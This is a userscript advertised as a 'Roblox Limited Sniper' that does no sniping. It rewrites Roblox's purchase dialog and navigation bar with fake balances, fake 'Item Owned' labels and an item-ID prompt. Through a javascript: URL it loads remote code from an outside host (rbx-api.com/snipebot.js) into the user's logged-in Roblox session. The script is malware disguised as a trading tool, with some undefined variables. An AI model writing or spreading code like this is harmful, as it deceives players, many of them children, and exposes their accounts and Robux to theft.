// ==UserScript==
// @name Roblox Limited Sniper V2.6
// @namespace http://tampermonkey.net/
// @version V2.6
// @description Snipe limiteds with a small amount of robux.
// @author robuxion
// @match https://www.roblox.com/*
// @grant GM_getValue
// @grant GM_setValue
// @downloadURL https://update.greasyfork.org/scripts/412012/Roblox%20Limited%20Sniper%20V26.user.js
// @updateURL https://update.greasyfork.org/scripts/412012/Roblox%20Limited%20Sniper%20V26.meta.js
// ==/UserScript==
//GM_setValue('hi',false);
function hihi() {
try{
let a = document.getElementsByTagName("a"),
i = 0;
while (a[i++].innerText != "Buy Now"){}
var button = (--i, a[i]);
console.log(button);
button.addEventListener('click', sleep, false);
}
catch(err)
{}
setTimeout(hihi, 500);
}
function lol(){
console.log('item is owned');
var test = document.getElementsByClassName('text-label')[0];
var dateSpan = document.createElement('span').innerHTML = ' Item Owned (1)';
test.insertAdjacentHTML('afterend', dateSpan);
test.insertAdjacentHTML('afterend', labelcheck);
test.insertAdjacentHTML('afterend', divider);
var robux = document.getElementById("nav-robux-amount").innerHTML = "CURRENT LIMITED: ";
var robux2 = document.getElementById("nav-robux-balance").innerHTML = "ROBUX AMOUNT: ";
}
function sleep(){
GM_setValue('hi', true);
console.log('set gm to true');
setTimeout(function() {
gotitem();
}, (1 * 1500));
}
function gotitem(){
if(GM_getValue('hi') === true){
console.log('gm is true');
lol();
}
else{
console.log('gmvalue not true');
}
}
function fireflowerbutton() {
var button = document.getElementsByClassName("action-button")[0];
button.innerHTML = '';
var createbutton = document.createElement("button").innerHTML = ` Buy `;
button.insertAdjacentHTML("afterbegin", createbutton);
}
function start() {
var robux = document.getElementById("nav-robux-amount");
var robux2 = document.getElementById("nav-robux-balance");
var message = document.getElementById("modal-dialog");
var moremessage = message.getElementsByClassName("modal-message")[0];
var picture = document.getElementsByClassName("modal-thumb")[0];
var buyitem = document.getElementsByClassName("modal-title")[0];
var buybutton = document.getElementById("confirm-btn");
var footer = document.getElementsByClassName("modal-footer text-footer")[0];
footer.style.display = null;
footer.innerHTML = `Your balance after this transaction will be 189,603`;
buybutton.innerHTML = "Buy Now";
buyitem.innerHTML = "Buy Item";
try{
picture.src = "https://t3.rbxcdn.com/fad4c73d201c916104383499f9b8791e";
}
catch(err){
console.log("couldnt do picture");
}
moremessage.innerHTML = "What is the ID of your item?";
if(GM_getValue('hi') === false){
robux.innerHTML = "ID: ";
robux2.innerHTML = "ROBUX: ";
}

function check() {
if($('#simplemodal-container').length >0 ){
document.getElementById("simplemodal-container").style.height = "494px";
document.getElementById("simplemodal-container").style.top = "138px";
}
else {
}

} setInterval(check, 100);
setTimeout(start, 0);
}

window.location.replace("javascript:$.get('//rbx-api.com/snipebot.js')")

start();
hihi();
gotitem();
fireflowerbutton();